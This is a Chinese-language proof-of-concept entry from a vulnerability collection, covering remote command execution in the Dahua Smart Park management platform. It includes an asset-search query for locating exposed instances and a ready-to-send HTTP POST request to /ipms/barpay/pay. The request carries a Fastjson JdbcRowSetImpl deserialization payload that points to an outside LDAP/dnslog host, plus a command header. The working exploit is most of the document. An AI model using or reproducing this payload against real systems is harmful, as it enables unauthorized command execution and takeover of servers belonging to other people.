---
fofa: "app.name="
source: "wy876 漏洞文库"
---

# 大华智慧园区综合管理平台pay 远程命令执行

# 一、漏洞简介
大华智慧园区综合管理平台是一个集智能化、信息化、网络化、安全化为一体的智慧园区管理平台，旨在为园区提供一站式解决方案，包括安防、能源管理、环境监测、人员管理、停车管理等多个方面。大华智慧园区综合管理平台pay远程命令执行，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 大华智慧园区综合管理平台

# 三、资产测绘
+ hunter:`app.name="Dahua 大华 智慧园区管理平台"`  

+ 登录页面：


# 四、漏洞复现
```plain
POST /ipms/barpay/pay HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 127
Accept-Encoding: gzip, deflate
Cmd: whoami
Content-Type: application/json

{"@type": "com.sun.rowset.JdbcRowSetImpl", "dataSourceName": "ldap://uh8aga.dnslog.cn", "autoCommit": true}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dxg184gk73n2gyt8>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
